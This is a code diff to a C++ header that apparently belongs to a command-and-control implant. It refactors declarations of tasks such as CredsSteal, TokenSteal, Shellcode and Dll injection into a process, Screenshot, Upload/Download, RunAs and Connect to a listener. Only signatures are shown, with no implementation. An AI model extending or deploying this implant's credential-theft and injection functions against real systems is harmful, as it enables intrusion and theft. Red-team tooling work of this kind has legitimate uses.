@@ -20,6 +20,7 @@
 #include <string>
 #include <vector>
 #include "core/macros.hpp"
+#include "core/state.hpp"
 #include "core/stdout.hpp"
 #include "core/system.hpp"
 #include "core/technique.hpp"
@@ -81,10 +82,11 @@ namespace Task
 
     std::wstring Cat(const std::wstring& wFilePath);
     std::wstring Cd(const std::wstring& wDestDir);
+    std::wstring Connect(State::StateManager& sm, const std::wstring& wListenerURL);
     std::wstring Cp(const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring CredsSteal();
-    std::wstring Dll(HINTERNET hConnect, const std::wstring& wPid, const std::wstring& wSrc);
-    std::wstring Download(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring Dll(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc);
+    std::wstring Download(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Execute(const std::wstring& wCmd);
     std::wstring Groups();
     std::wstring History();
@@ -104,12 +106,13 @@ namespace Task
     std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecurse);
     std::wstring Rm(const std::wstring& wFile);
     std::wstring Rmdir(const std::wstring& wDir);
-    std::wstring Screenshot(HINSTANCE hInstance, INT nCmdShow);
-    std::wstring Shellcode(HINTERNET hConnect, const std::wstring& wPid, const std::wstring& wSrc);
-    std::wstring Sleep(const std::wstring& wSleepTime, INT &nSleep);
+    std::wstring RunAs(const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
+    std::wstring Screenshot(State::StateManager& sm);
+    std::wstring Shellcode(State::StateManager& sm, const std::wstring& wPid, const std::wstring& wSrc);
+    std::wstring Sleep(State::StateManager& sm, const std::wstring& wSleepTime);
     std::wstring TokenRevert();
     std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName);
-    std::wstring Upload(HINTERNET hConnect, const std::wstring& wSrc, const std::wstring& wDest);
+    std::wstring Upload(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Users();
     std::wstring Whoami();
     std::wstring WhoamiPriv();
